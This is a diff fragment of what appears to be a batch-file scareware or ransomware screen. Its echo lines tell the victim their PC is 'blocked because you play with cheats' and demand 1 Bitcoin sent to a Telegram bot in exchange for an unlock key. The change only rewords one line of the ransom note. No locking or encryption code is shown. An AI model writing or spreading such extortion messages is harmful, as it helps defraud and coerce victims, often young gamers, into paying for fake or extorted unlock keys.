@@ -32,7 +32,7 @@ echo 				Hello my friend! your pc has blocked because you play with cheats!
 
 echo 				For unblocked your pc you need send 1 Bitcoin to this wallet: t.me/UnlokekBot!
 
-echo 				And Then i give you link where the bot will give you the key!
+echo 				                 And the bot will give you the key!
 
 echo 							good luck!
 
